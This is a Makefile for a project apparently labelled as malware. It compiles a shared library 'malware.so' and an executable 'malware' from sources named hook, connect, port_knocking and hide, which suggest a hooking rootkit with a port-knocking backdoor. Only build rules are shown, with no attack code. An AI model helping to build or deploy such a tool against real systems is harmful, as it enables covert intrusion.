CC = gcc
CFLAGS = -Wall -Wextra -ldl
SOFLAGS = -shared -fPIC

OUT_SO = malware.so
OUT_EXE = malware

SRC_SO = hook.c connect.c port_knocking.c hide.c
SRC_EXE = main.c connect.c port_knocking.c hide.c

$(OUT_SO): $(SRC_SO)
	$(CC) $(SOFLAGS) -o $(OUT_SO) $(SRC_SO)

$(OUT_EXE): $(SRC_EXE)
	$(CC) $(CFLAGS) -o $(OUT_EXE) $(SRC_EXE) -ldl

all: $(OUT_SO) $(OUT_EXE)

clean:
	rm -f $(OUT_SO) $(OUT_EXE)
